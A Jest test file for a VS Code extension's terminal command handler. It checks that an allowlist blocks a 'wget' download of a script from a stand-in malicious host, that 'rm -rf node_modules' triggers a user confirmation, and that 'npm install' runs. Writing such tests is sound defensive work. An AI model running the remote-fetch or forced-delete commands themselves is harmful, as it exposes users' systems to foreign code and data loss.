import * as vscode from 'vscode';
import { TerminalCommandHandler } from '../TerminalCommandHandler';
import { MessageRouter } from '../../../core/network/MessageRouter';
import { spawn } from 'child_process';

jest.mock('child_process', () => ({
    spawn: jest.fn()
}));

describe('TerminalCommandHandler', () => {
    let router: MessageRouter;
    let mockConnectionManager: any;
    let logMock: any;
    let commandHandler: TerminalCommandHandler;

    beforeEach(() => {
        jest.clearAllMocks();
        router = new MessageRouter();
        mockConnectionManager = {
            broadcast: jest.fn()
        };
        logMock = jest.fn();

        commandHandler = new TerminalCommandHandler(router, mockConnectionManager, logMock);
    });

    test('should reject command not in allowlist', async () => {
        const payload = JSON.stringify({
            type: 'EXECUTE_COMMAND',
            command: 'wget http://malicious.com/script.sh'
        });

        await router.route(payload, {} as any);

        expect(mockConnectionManager.broadcast).toHaveBeenCalledWith(
            expect.objectContaining({ text: expect.stringContaining('Command not in allowlist') })
        );
        expect(spawn).not.toHaveBeenCalled();
    });

    test('should prompt for confirmation on destructive commands', async () => {
        const payload = JSON.stringify({
            type: 'EXECUTE_COMMAND',
            command: 'rm -rf node_modules'
        });

        // Mock user clicking "Cancel"
        (vscode.window.showWarningMessage as jest.Mock).mockResolvedValueOnce('Cancel');

        await router.route(payload, {} as any);

        expect(vscode.window.showWarningMessage).toHaveBeenCalledWith(
            expect.stringContaining("Execute destructive command"),
            { modal: true },
            "Execute",
            "Cancel"
        );
        expect(mockConnectionManager.broadcast).toHaveBeenCalledWith(
            expect.objectContaining({ text: expect.stringContaining('cancelled by user') })
        );
        expect(spawn).not.toHaveBeenCalled();
    });

    test('should execute valid allowlisted commands', async () => {
        const payload = JSON.stringify({
            type: 'EXECUTE_COMMAND',
            command: 'npm install'
        });

        const mockChild = {
            stdout: { on: jest.fn() },
            stderr: { on: jest.fn() },
            on: jest.fn(),
            kill: jest.fn()
        };
        (spawn as jest.Mock).mockReturnValue(mockChild);

        await router.route(payload, {} as any);
        
        expect(spawn).toHaveBeenCalled();
        expect(mockConnectionManager.broadcast).not.toHaveBeenCalledWith(
            expect.objectContaining({ text: expect.stringContaining('Command not in allowlist') })
        );
    });
});
